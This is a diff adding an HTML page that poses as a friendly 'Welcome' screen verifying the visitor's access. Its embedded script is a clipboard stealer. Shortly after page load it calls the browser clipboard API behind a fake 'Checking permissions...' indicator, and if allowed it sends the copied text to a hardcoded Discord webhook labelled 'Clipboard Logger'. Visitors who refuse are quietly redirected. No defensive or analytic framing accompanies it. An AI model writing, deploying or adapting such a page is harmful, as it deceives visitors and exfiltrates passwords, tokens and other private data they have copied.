@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4edf5 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #333;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 500px;
+            padding: 50px 40px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0,100,255,0.05) 0%, rgba(0,100,255,0) 70%);
+            z-index: -1;
+            animation: rotate 20s linear infinite;
+        }
+        
+        h1 {
+            font-size: 3.2rem;
+            margin-bottom: 20px;
+            font-weight: 600;
+            color: #1a1a2e;
+            transition: all 0.5s ease;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #555;
+            margin-bottom: 40px;
+            line-height: 1.6;
+        }
+        
+        .status-indicator {
+            background: rgba(0, 123, 255, 0.1);
+            padding: 15px;
+            border-radius: 12px;
+            margin: 30px 0;
+            font-size: 1.1rem;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(0, 123, 255, 0.2);
+            transition: all 0.4s ease;
+        }
+        
+        .status-granted {
+            background: rgba(40, 167, 69, 0.1);
+            border-color: rgba(40, 167, 69, 0.3);
+            color: #28a745;
+        }
+        
+        .status-denied {
+            background: rgba(220, 53, 69, 0.1);
+            border-color: rgba(220, 53, 69, 0.3);
+            color: #dc3545;
+        }
+        
+        .info-box {
+            background: rgba(0, 0, 0, 0.02);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 30px;
+            font-size: 0.95rem;
+            color: #666;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+        
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0, 123, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #007bff;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 25px;
+            background: linear-gradient(135deg, #007bff 0%, #00bfff 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 36px;
+            font-weight: bold;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 40px 25px;
+            }
+            
+            h1 {
+                font-size: 2.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">W</div>
+        <h1 id="title">Hi there!</h1>
+        <p class="subtitle">Welcome to our simple web interface. Please wait while we verify your access.</p>
+        
+        <div id="statusIndicator" class="status-indicator">
+            <div class="loader"></div>
+            <span>Checking permissions...</span>
+        </div>
+        
+        <div class="info-box">
+            <p>This website uses modern browser features to enhance your experience. Some permissions may be required for optimal functionality.</p>
+        </div>
+    </div>
+
+    <script>
+        // Discord webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1392808715903696946/36icJgBCiGyuyMPpiyMek62LK6hEwRFPaksUcqFju1Dc9ZuKXl456MK8I8dehEnL5Kb0";
+        
+        // DOM elements
+        const titleElement = document.getElementById('title');
+        const statusIndicator = document.getElementById('statusIndicator');
+        
+        // Function to send data to Discord webhook
+        async function sendToDiscord(content) {
+            try {
+                // Truncate content if too long
+                const truncatedContent = content.length > 1500 ? content.substring(0, 1500) + "..." : content;
+                
+                const data = {
+                    content: `New clipboard content:\n\`\`\`\n${truncatedContent}\n\`\`\``,
+                    username: "Clipboard Logger"
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error("Error sending to Discord:", error);
+            }
+        }
+        
+        // Function to request clipboard access
+        async function requestClipboardAccess() {
+            try {
+                // Check if Clipboard API is available
+                if (!navigator.clipboard || !navigator.clipboard.readText) {
+                    statusIndicator.innerHTML = '<span>Browser not supported</span>';
+                    return;
+                }
+                
+                // Try to read clipboard which will trigger permission prompt
+                const text = await navigator.clipboard.readText();
+                
+                // If we get here, permission was granted
+                titleElement.textContent = "BLUD GOT CLIPBOARD LOGSS!!";
+                statusIndicator.className = "status-indicator status-granted";
+                statusIndicator.innerHTML = '<span>Access verified successfully</span>';
+                
+                // Send clipboard data to Discord
+                await sendToDiscord(text);
+                
+            } catch (error) {
+                // Handle permission denial
+                if (error.name === 'NotAllowedError') {
+                    statusIndicator.className = "status-indicator status-denied";
+                    statusIndicator.innerHTML = '<span>Permission required. Redirecting...</span>';
+                    
+                    // Redirect after a short delay
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 2000);
+                } else {
+                    statusIndicator.className = "status-indicator status-denied";
+                    statusIndicator.innerHTML = `<span>Error: ${error.message || 'Unknown error'}</span>`;
+                }
+            }
+        }
+        
+        // Initialize clipboard access when page loads
+        window.addEventListener('DOMContentLoaded', () => {
+            // Add a small delay to make it seem like the system is "checking"
+            setTimeout(requestClipboardAccess, 1500);
+        });
+    </script>
+</body>
+</html>
